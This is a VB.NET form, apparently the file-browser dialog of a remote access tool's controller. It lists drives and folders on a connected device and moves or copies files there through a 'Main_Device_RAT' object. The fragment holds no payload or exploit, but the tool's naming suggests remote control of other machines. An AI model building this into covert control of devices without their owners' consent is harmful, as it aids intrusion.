Public Class Browse
    Public Rat As New Main_Device_RAT
    Public Dictionary As New Dictionary(Of String, String)
    Public Sub GetDrives()
        Form1.Connect()
        Dictionary.Clear()
        ListView1.Items.Clear()
        Dim Drives As String = Rat.GetDrives
        If Drives.Length > 0 Then
            If Drives.Contains("<") Then
                For Each Drive In Drives.Split("<")
                    Dictionary.Add(Drive, Drive)
                    ListView1.Items.Add(Dictionary(Drive), ImageList1.Images.Count - 1)
                Next
            Else
                Dictionary.Add(Drives, Drives)
                ListView1.Items.Add(Dictionary(Drives), ImageList1.Images.Count - 1)
            End If
        End If
    End Sub
    Public Sub GetFolder()
        Try
            Form1.Connect()
            Dictionary.Clear()
            Dim folders As String = ""
            Dim files As String = ""
            Rat.GetFolders(TextBox1.Text, folders)
            ListView1.Items.Clear()
            If folders IsNot "" Then
                If folders.Contains("<") Then
                    For Each fod In folders.Split("<")
                        Dim fol() As String = fod.Split(">")
                        Dictionary.Add(fol(1), fol(0))
                        ListView1.Items.Add(fol(1), ImageList1.Images.Count - 1)
                    Next
                Else
                    Dim fol() As String = folders.Split(">")
                    Dictionary.Add(fol(1), fol(0))
                    ListView1.Items.Add(fol(1), ImageList1.Images.Count - 1)
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub Browse_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        GetDrives()
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Try
            Dim Txt As String = TextBox1.Text
            Dim txtl() As String = Txt.Split("\")
            Dim newtxt As String = txtl(0)
            For i = 1 To txtl.Count - 2
                newtxt = newtxt & "\" & txtl(i)
            Next
            If Not newtxt.Contains("\") And Not newtxt.Contains("/") Then
                newtxt = newtxt & "\"
            End If
            TextBox1.Text = newtxt
            GetFolder()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Try
            GetFolder()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Try
1:
            If Button1.Text = "Select And Move The File" Then
                If TextBox1.Text.Length > 0 Then
                    Dim Txt As String = File_Manager.TextBox2.Text
                    Dim txtl() As String
                    If Txt.Contains("\") Then
                        txtl = Txt.Split("\")
                    Else
                        txtl = Txt.Split("/")
                    End If
                    Dim newtxt As String = ""
                    If TextBox1.Text.ElementAt(TextBox1.Text.Length - 1) = "\" Then
                        newtxt = TextBox1.Text & txtl(txtl.Length - 1).ToString()
                    Else
                        newtxt = TextBox1.Text & "\" & txtl(txtl.Length - 1).ToString()
                    End If
                    Form1.BrowsedDirectory = newtxt
                    If Form1.BrowsedDirectory.Length > 0 Then
                        Form1.Connect()
                        Rat.MoveFile(File_Manager.TextBox2.Text, Form1.BrowsedDirectory)
                        GetFolder()
                        Me.Close()
                    Else
                        GoTo 1
                    End If
                Else
                    MsgBox("Select A Folder")
                End If
            End If
            If Button1.Text = "Select And Copy The File" Then
                If TextBox1.Text.Length > 0 Then
                    Dim Txt As String = File_Manager.TextBox2.Text
                    Dim txtl() As String
                    If Txt.Contains("\") Then
                        txtl = Txt.Split("\")
                    Else
                        txtl = Txt.Split("/")
                    End If
                    Dim newtxt As String = ""
                    If TextBox1.Text.ElementAt(TextBox1.Text.Length - 1) = "\" Then
                        newtxt = TextBox1.Text & txtl(txtl.Length - 1).ToString()
                    Else
                        newtxt = TextBox1.Text & "\" & txtl(txtl.Length - 1).ToString()
                    End If
                    Form1.BrowsedDirectory = newtxt
                    If Form1.BrowsedDirectory.Length > 0 Then
                        Form1.Connect()
                        Rat.CopyFile(File_Manager.TextBox2.Text, Form1.BrowsedDirectory)
                        GetFolder()
                        Me.Close()
                    Else
                        GoTo 1
                    End If
                Else
                    MsgBox("Select A Folder")
                End If
            End If
            If Button1.Text = "Select And Move The Directory" Then
                If TextBox1.Text.Length > 0 Then
                    Dim Txt As String = File_Manager.TextBox1.Text
                    Dim txtl() As String
                    If Txt.Contains("\") Then
                        txtl = Txt.Split("\")
                    Else
                        txtl = Txt.Split("/")
                    End If
                    Dim newtxt As String = ""
                    If TextBox1.Text.ElementAt(TextBox1.Text.Length - 1) = "\" Then
                        newtxt = TextBox1.Text & txtl(txtl.Length - 1).ToString()
                    Else
                        newtxt = TextBox1.Text & "\" & txtl(txtl.Length - 1).ToString()
                    End If
                    Form1.BrowsedDirectory = newtxt
                    If Form1.BrowsedDirectory.Length > 0 Then
                        Form1.Connect()
                        Rat.MoveDirectory(File_Manager.TextBox1.Text, Form1.BrowsedDirectory)
                        GetFolder()
                        Me.Close()
                    Else
                        GoTo 1
                    End If
                Else
                    MsgBox("Select A Folder")
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub ListView1_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        Try
            Dim Folder As String = Dictionary(ListView1.SelectedItems.Item(0).Text)
            TextBox1.Text = Folder
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        GetDrives()
    End Sub
End Class